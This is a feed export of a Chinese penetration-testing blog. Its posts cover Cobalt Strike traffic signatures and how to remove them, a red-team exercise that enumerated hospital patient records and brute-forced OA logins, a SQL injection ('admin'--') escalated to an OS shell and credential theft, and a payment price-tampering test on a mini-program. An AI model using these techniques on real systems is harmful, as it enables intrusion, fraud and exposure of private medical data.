    <content type="html"><![CDATA[<p>感觉自己太废物了。麻了</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/22/641b22236e4f0.png"                      alt="1679499808913.png"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;感觉自己太废物了。麻了&lt;/p&gt;
&lt;p&gt;&lt;img  
                     lazyload
                     alt=&quot;image&quot;
                     data-src=&quot;https://blog-1254</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cobalt Strike 流量特征</title>
    <link href="http://example.com/2023/08/18/Cobalt%20Strick%20%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/"/>
    <id>http://example.com/2023/08/18/Cobalt%20Strick%20%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/</id>
    <published>2023-08-18T05:50:05.674Z</published>
    <updated>2023-08-19T00:48:56.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike-流量特征"><a href="#Cobalt-Strike-流量特征" class="headerlink" title="Cobalt Strike 流量特征"></a>Cobalt Strike 流量特征</h1><p>总结来源于网上资料， 有错的地方欢迎各位大佬指正。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="简介：Cobalt-Strike-is-software-for-Adversary-Simulations-and-Red-Team-Operations-Cobalt-Strike-简称CS，-A-team详细介绍使用网址。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。"><a href="#简介：Cobalt-Strike-is-software-for-Adversary-Simulations-and-Red-Team-Operations-Cobalt-Strike-简称CS，-A-team详细介绍使用网址。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。" class="headerlink" title="简介：Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， A-team详细介绍使用网址。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。"></a>简介：Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， A-team详细介绍使用网址。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。</h3><h3 id="Cobalt-Strike-是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁-者的后渗透行动"><a href="#Cobalt-Strike-是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁-者的后渗透行动" class="headerlink" title="Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动"></a>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动</h3><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><h3 id="默认端口-50050"><a href="#默认端口-50050" class="headerlink" title="默认端口 50050"></a>默认端口 50050</h3><h3 id="SSL-证书流量特征："><a href="#SSL-证书流量特征：" class="headerlink" title="SSL 证书流量特征："></a>SSL 证书流量特征：</h3><ul><li>keystore type: jks</li><li>Alias name: cobaltstrike</li><li>Own: CN&#x3D;Major Cobalt Strike</li><li>Issuer: CN&#x3D;Major Cobalt Strike</li></ul><h3 id="默认-C-S-端通讯证书：字段和固定哈希值识别"><a href="#默认-C-S-端通讯证书：字段和固定哈希值识别" class="headerlink" title="默认 C&#x2F;S 端通讯证书：字段和固定哈希值识别"></a>默认 C&#x2F;S 端通讯证书：字段和固定哈希值识别</h3><h3 id="可以看到beacon的通信"><a href="#可以看到beacon的通信" class="headerlink" title="可以看到beacon的通信"></a>可以看到beacon的通信</h3><h2 id="对比正常的http流量，CS的http通信流量具有以下几个特征："><a href="#对比正常的http流量，CS的http通信流量具有以下几个特征：" class="headerlink" title="对比正常的http流量，CS的http通信流量具有以下几个特征："></a>对比正常的http流量，CS的http通信流量具有以下几个特征：</h2><h3 id="心跳包特征"><a href="#心跳包特征" class="headerlink" title="心跳包特征"></a>心跳包特征</h3><ul><li>a)间隔一定时间，均有通信，且流级上的上下行数据长度固定；</li></ul><h3 id="域名-IP特征"><a href="#域名-IP特征" class="headerlink" title="域名&#x2F;IP特征"></a>域名&#x2F;IP特征</h3><ul><li>a)未走CDN、域前置的，域名及IP暴露</li><li>b) 走CDN、域前置的，真实IP会被隐藏；</li></ul><h3 id="指令特征"><a href="#指令特征" class="headerlink" title="指令特征"></a>指令特征</h3><ul><li><pre><code>a)下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。</code></pre></li><li><pre><code>b)指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。</code></pre></li><li><pre><code>c)不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。</code></pre></li></ul><h3 id="数据特征"><a href="#数据特征" class="headerlink" title="数据特征"></a>数据特征</h3><ul><li>a)在请求的返回包中，通信数据均隐藏在jqeury*.js中。</li></ul><h2 id="去除特征的方法"><a href="#去除特征的方法" class="headerlink" title="去除特征的方法"></a>去除特征的方法</h2><h3 id="修改默认端口50050"><a href="#修改默认端口50050" class="headerlink" title="修改默认端口50050"></a>修改默认端口50050</h3><h3 id="修改默认ssl证书"><a href="#修改默认ssl证书" class="headerlink" title="修改默认ssl证书"></a>修改默认ssl证书</h3><ul><li>keytool -list -v -keystore cobaltstrike.store                                           </li><li>参考链接：<a class="link"   href="https://www.cnblogs.com/CoLo/p/14518441.html#0x00-%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%9A%84cs" >https://www.cnblogs.com/CoLo/p/14518441.html#0x00-%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%9A%84cs<i class="fas fa-external-link-alt"></i></a></li></ul><h3 id="修改profile"><a href="#修改profile" class="headerlink" title="修改profile"></a>修改profile</h3><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/24/641c789d879df.png"                      alt="Cobalt Strike 流量特征 分析.png"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Cobalt-Strike-流量特征&quot;&gt;&lt;a href=&quot;#Cobalt-Strike-流量特征&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike 流量特征&quot;&gt;&lt;/a&gt;Cobalt Strike 流量特征&lt;/h1&gt;&lt;p&gt;总结来源于网</summary>
      
    
    
    
    <category term="攻防演练" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="蓝队" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E8%93%9D%E9%98%9F/"/>
    
    
    <category term="流量分析" scheme="http://example.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>文件包含&amp;文件其他操作&amp;RCE思维导图</title>
    <link href="http://example.com/2023/08/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;%E6%96%87%E4%BB%B6%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C&amp;RCE%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>http://example.com/2023/08/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;%E6%96%87%E4%BB%B6%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C&amp;RCE%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</id>
    <published>2023-08-18T05:50:05.668Z</published>
    <updated>2023-08-18T06:11:18.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含-文件其他操作-RCE思维导图"><a href="#文件包含-文件其他操作-RCE思维导图" class="headerlink" title="文件包含&amp;文件其他操作&amp;RCE思维导图"></a>文件包含&amp;文件其他操作&amp;RCE思维导图</h1><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022%2F09%2F3537048386.png"                      alt="第42天文件包含.png"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022%2F09%2F3813335311.png"                      alt="第43天 文件其他操作.png"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022%2F09%2F90962572.png"                      alt="第44天-RCE.png"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含-文件其他操作-RCE思维导图&quot;&gt;&lt;a href=&quot;#文件包含-文件其他操作-RCE思维导图&quot; class=&quot;headerlink&quot; title=&quot;文件包含&amp;amp;文件其他操作&amp;amp;RCE思维导图&quot;&gt;&lt;/a&gt;文件包含&amp;amp;文件其他操作&amp;amp;R</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>某次市护总结</title>
    <link href="http://example.com/2023/08/01/%E6%9F%90%E6%AC%A1%E5%B8%82%E7%BA%A7hw%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/08/01/%E6%9F%90%E6%AC%A1%E5%B8%82%E7%BA%A7hw%E6%80%BB%E7%BB%93/</id>
    <published>2023-08-01T13:17:10.000Z</published>
    <updated>2023-08-18T16:07:40.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="某次市护总结"><a href="#某次市护总结" class="headerlink" title="某次市护总结"></a>某次市护总结</h1><h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p>本次测试均在有授权，且在现场符合要求的情况下进行测试，请大家切勿非法渗透。</p><p>传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢</p><h1 id="查看评分标准，收集资产"><a href="#查看评分标准，收集资产" class="headerlink" title="查看评分标准，收集资产"></a>查看评分标准，收集资产</h1><p>这次数据分给的比较高，所以重点是找数据</p><h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><ol><li>0-nday攻击 内网横向 获取敏感数据 </li><li>弱口令爆破OA以及其他后台系统</li><li>sql注入拿到数据库权限</li><li>wx公众号资产测试</li></ol><h1 id="0x01-公众号入口"><a href="#0x01-公众号入口" class="headerlink" title="0x01 公众号入口"></a>0x01 公众号入口</h1><p>现在大多数的web资产都部署有waf等设备，部分企业的小程序或者微信公众号可能会有所忽略，可以尝试从apk或者公众号以及小程序入手<br>本次主要是从微信公众号获取挂号链接进行id遍历，从而获取到整个医院的所有数据 其中身份证、手机号、姓名以及病例信息等。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804155015.png"                      alt="20230804155015"                ></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /WxApp/xxx HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 620</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/6.8.0(0x16080000) MacWechat/3.8.1(0x13080110) XWEB/30626 Flue</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: *</span><br><span class="line">Referer: *</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh</span><br><span class="line">Cookie: JSESSIONID=</span><br><span class="line"></span><br><span class="line">params=&#123;&quot;REQ_HEAD&quot;:&#123;&quot;TRAN_CODE&quot;:&quot;xxx&quot;&#125;,&quot;REQ_BODY&quot;:&#123;&quot;tradeType&quot;:&quot;xxx&quot;,&quot;InHead&quot;:&#123;&quot;BusinessNumber&quot;:&quot;xxx&quot;,&quot;TerminalNumber&quot;:&quot;xxx&quot;,&quot;CooperationUnit&quot;:&quot;xxx&quot;&#125;,&quot;InBody&quot;:&#123;&quot;PatientId&quot;:&quot;xxx&quot;,&quot;BeginApplyTime&quot;:&quot;2023-x-x 00:00:00&quot;&#125;&#125;&#125;&amp;time=xxx&amp;sign=xxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击查询，抓包其中PatientId参数可控，可以遍历id，从而获取其他用户数据 由于参数过大，这里只遍历后5位，证明存在即可。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804161540.png"                      alt="123"                ></p><p>查看响应</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804160011.png"                      alt="20230804160011"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804160108.png"                      alt="20230804160108"                ></p><p>可以看到门诊数据身份证等敏感信息。修改id可以达到遍历全院所有医患数据。</p><h1 id="0x02-暴力破解YYDS"><a href="#0x02-暴力破解YYDS" class="headerlink" title="0x02 暴力破解YYDS"></a>0x02 暴力破解YYDS</h1><h2 id="暴力破解常见思路"><a href="#暴力破解常见思路" class="headerlink" title="暴力破解常见思路"></a>暴力破解常见思路</h2><ol><li>无验证码</li><li>验证码可复用</li><li>提示账户不存在&#x2F;密码错误</li><li>前端校验 修改返回码</li><li>传输加密 （这种需要js逆向分析）</li></ol><h3 id="无验证码模式"><a href="#无验证码模式" class="headerlink" title="无验证码模式"></a>无验证码模式</h3><p>针对无验证码的模式，我的思路一般是直接字典一把梭哈 用户可以利用常见的 <code>admin</code> <code>test</code> <code>ceshi</code> <code>123</code> <code>sysadmin</code>等</p><p>fuzz字典推荐 ：<a class="link"   href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master" >https://github.com/TheKingOfDuck/fuzzDicts/tree/master<i class="fas fa-external-link-alt"></i></a> </p><p>密码可以先跑弱口令，无果可以尝试生成社工字典。github一搜就有一大堆</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804162141.png"                      alt="20230804162141"                ></p><p>我个人喜欢用 <a class="link"   href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator" >https://github.com/zgjx6/SocialEngineeringDictionaryGenerator<i class="fas fa-external-link-alt"></i></a></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804162656.png"                      alt="20230804162656"                ></p><h3 id="验证码复用"><a href="#验证码复用" class="headerlink" title="验证码复用"></a>验证码复用</h3><p>这种其实遇到的其实蛮多的，很多时候有的师傅看到验证码就直接跳过了，其实很多时候的验证码是可以直接复用爆破的，也有的是删除验证码字段即可绕过，思路就和无验证码是一样的。</p><h3 id="账户不存在-密码错误"><a href="#账户不存在-密码错误" class="headerlink" title="账户不存在&#x2F;密码错误"></a>账户不存在&#x2F;密码错误</h3><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804164819.png"                      alt="20230804164819"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804164842.png"                      alt="20230804164842"                ></p><p>这种是我最喜欢的了，这种是首先跑一遍用户字典，密码我通常会填<code>123456</code> 然后看回显。回显密码错误的就直接搞个大的密码字典直接跑，有时候运气好，还能跑出来几个<code>123456</code> 密码的用户</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>这里遇到的是一个医院的OA系统</p><p>以前爆破OA从来没有成功过</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804164309.png"                      alt="20230804164309"                ></p><p>后面发现是自己姿势不对，跑字典的时候害怕太慢了，所以跑了小一会就直接放弃跑路了</p><p>其实不然，很多时候等待字典跑完可能会有惊喜，我用的是一个爆破OA账户的字典，有差不多2w条，抱着不会成功的态度，跑着就丢在那里了，测完另外几个才想起这里还在跑，然后回来发现有个用户提示密码错误，然后手动测了一下几个弱口令，然后<code>123</code>进去了</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804164459.png"                      alt="20230804164459"                ></p><p>这里密码base64了一下 也算是加密传输中的一种，不过太简单了，这种bp也可以直接跑。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804165019.png"                      alt="20230804165019"                ></p><p>这里直接拿到4个账号，然后可以直接对这4个账号进行遍历密码爆破，最后成功进入后台</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804192400.png"                      alt="20230804192400"                ></p><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>这种有，但是不咋多 常见的就是去前端js查看正确返回的响应码是多少，然后拦截返回包，直接修改，有的是改true 然后删除一些msg 什么的，</p><p>废话不说 直接上案例</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804173508.png"                      alt="20230804173508"                ></p><p>正常情况错误返回500，还有其他的信息 修改500为200  登录成功</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/1691141824864.jpg"                      alt="1691141824864"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/1691141823426.jpg"                      alt="1691141823426"                ></p><p>成功进入后台，也能获取到数据。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804192148.png"                      alt="20230804192148"                ></p><h1 id="0x03-0-nday"><a href="#0x03-0-nday" class="headerlink" title="0x03 0-nday"></a>0x03 0-nday</h1><p>思路就是 多总结收集常见的OA以及每年HW爆出来的常见的利用漏洞</p><p>例如 OA  利用常见的OA利用工具进行利用，或者自己有的0day或者未公开利用的1day啥的。 然后再进入内网横向，翻一翻配置文件什么的。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804174947.png"                      alt="20230804174947"                ></p><p>这里大佬也是直接穿越了三个网络 由互联网-&gt;教育网-&gt;内网<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804175302.png"                      alt="20230804175302"                ></p><p>另外，旁边大佬还掏了个图书馆的0day 没好意思要 hh</p><h1 id="0x04-互联网虚拟云桌面"><a href="#0x04-互联网虚拟云桌面" class="headerlink" title="0x04 互联网虚拟云桌面"></a>0x04 互联网虚拟云桌面</h1><p>这里也是运气好，直接用弱口令就进了云桌面。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804175752.png"                      alt="20230804175752"                ></p><p>直接上线cs读了密码，起代理远程控制连接，也是拿到了财务管理系统的权限 拿到了不少数据</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804175944.png"                      alt="20230804175944"                ></p><p>同时还扫到内网几个ms17010</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上内容仅代表个人看法和观点，不足的地方还望各位大佬指正。</p><p>另外还有不少成果处理太麻烦就不写了，还有是依一些是大佬的成果，我写出来也不好，hh 主要是分享一下个人的一些心得和思路。</p><p>总之是跟着大佬学到了不少东西，不论是外网打点，还是内网的一些横向手段。大佬总是很低调，说话也很谦虚。只是在某个不经意之间，就直接偷偷拿了shell。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804181611.png"                      alt="20230804181611"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804181659.png"                      alt="20230804181659"                ></p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/blog/20230804181732.png"                      alt="20230804181732"                ></p><p>总之，学无止境，永远不要停止脚步！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;某次市护总结&quot;&gt;&lt;a href=&quot;#某次市护总结&quot; class=&quot;headerlink&quot; title=&quot;某次市护总结&quot;&gt;&lt;/a&gt;某次市护总结&lt;/h1&gt;&lt;h1 id=&quot;免责声明&quot;&gt;&lt;a href=&quot;#免责声明&quot; class=&quot;headerlink&quot; title=&quot;免</summary>
      
    
    
    
    <category term="攻防演练" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="红队" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E7%BA%A2%E9%98%9F/"/>
    
    
    <category term="攻防演练" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
  </entry>
  
  <entry>
    <title>从sql注入到远程登录的简单利用</title>
    <link href="http://example.com/2023/06/01/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2023/06/01/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</id>
    <published>2023-06-01T13:17:10.000Z</published>
    <updated>2023-08-19T02:49:18.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从sql注入到远程登录的简单利用"><a href="#从sql注入到远程登录的简单利用" class="headerlink" title="从sql注入到远程登录的简单利用"></a>从sql注入到远程登录的简单利用</h1><p>很近没写文章了，来水水文章。<br>请大家遵守网络安全法，切勿非法渗透。本文漏洞已报告给学校。</p><p>最近收集了一些内网的资产，遇到一个有意思的系统，然后就随便搞了玩玩。比较简单，大佬勿喷。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406dd284d3d5.png"                      alt="1678171429754.png"                ></p><p>首先来一手弱口令，提示用户密码错误，哦豁，没戏了，弱口令进不去，直接放弃。<br>开个玩笑，尝试一下闭合，发现报错，</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406dd5c6157a.png"                      alt="1678171482232.png"                ></p><p>发现报错，</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406e139600b1.png"                      alt="1678172471978.png"                ></p><p>接着我试了一下admin’– admin 万能密码，登录成功。</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406e29a5e1ca.png"                      alt="1678172824898.png"                ></p><p>成功进入系统那么可以肯定这里是有注入的，直接sqlmap一把梭哈，</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406ddc0a4f54.png"                      alt="1678171583192.png"                ></p><p>发现是sqlserver ，直接–os-shell</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406ddd1dc004.png"                      alt="1678171600213.png"                ></p><p>然后web投递上线cs 上线提权 </p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406e1ba9fe6f.png"                      alt="1678172601321.png"                ></p><p>再利用插件获取明文密码 administrator  xxxxx</p><p>然后登录 这里管理员改了一下登录的端口 27020 </p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406e1e31e818.png"                      alt="1678172641748.png"                ></p><p>登录成功。<br>但是想了想，没拿到密码，还想进一步，翻了下文件，看到备份文件</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406de4a892f9.png"                      alt="1678171721118.png"                ><br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406de679ac64.png"                      alt="1678171750018.png"                ><br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406de6fe650a.png"                      alt="1678171758579.png"                ></p><p>看到有密码，但是连接错误</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406de799d08d.png"                      alt="1678171768470.png"                ></p><p>改用windows身份验证，可以直接登录</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406de85d639f.png"                      alt="1678171780711.png"                ></p><p>成功登录，然后选中刚刚的数据库，新建查询，</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406e34067d70.png"                      alt="1678172990897.png"                ></p><p>密码md5加密过了，凭经验，可以知道，好几个密码是123456  </p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406dea7f3314.png"                      alt="1678171814401.png"                ></p><p>选择登录  登录成功</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/07/6406e24f4b9a3.png"                      alt="1678172749412.png"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;从sql注入到远程登录的简单利用&quot;&gt;&lt;a href=&quot;#从sql注入到远程登录的简单利用&quot; class=&quot;headerlink&quot; title=&quot;从sql注入到远程登录的简单利用&quot;&gt;&lt;/a&gt;从sql注入到远程登录的简单利用&lt;/h1&gt;&lt;p&gt;很近没写文章了，来水水文章。</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="漏洞挖掘" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="web渗透" scheme="http://example.com/tags/web%E6%B8%97%E9%80%8F/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="后渗透" scheme="http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>记一次小程序支付逻辑漏洞测试</title>
    <link href="http://example.com/2023/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"/>
    <id>http://example.com/2023/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/</id>
    <published>2023-06-01T13:17:10.000Z</published>
    <updated>2023-08-19T01:40:26.150Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次小程序支付逻辑漏洞测试"><a href="#记一次小程序支付逻辑漏洞测试" class="headerlink" title="记一次小程序支付逻辑漏洞测试"></a>记一次小程序支付逻辑漏洞测试</h1><p>闲来无事，无聊至极，羊了个羊很火，奈何太菜，通宵达旦，未能过关，于是另寻捷径。<br>bp+proxifier搞一搞，抓到包直接重放。<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/6324378215308.png"                      alt="1663317886992.png"                ></p><p>T值应该是自己的token，换成自己的，然后干嘛，然后直接intruder开干啊，截图装逼啊，还等啥。<br>于是呢 小小的刷了一波<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/6324382723d35.png"                      alt="1663318052281.png"                ><br>各位看个乐呵就行。<br>完了后转手看到一个别的小程序，里面有个商城，心想：看看有无支付逻辑漏洞试一试。<br>试试就逝世。<br>于是忙碌了一天的S师傅开心的打开了某小程序，开心的换了一换那里的纸巾，然后 一不小心 改了他的价格 0.01，给我吓一跳<br><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2022/09/16/632438c9cabac.jpg"                      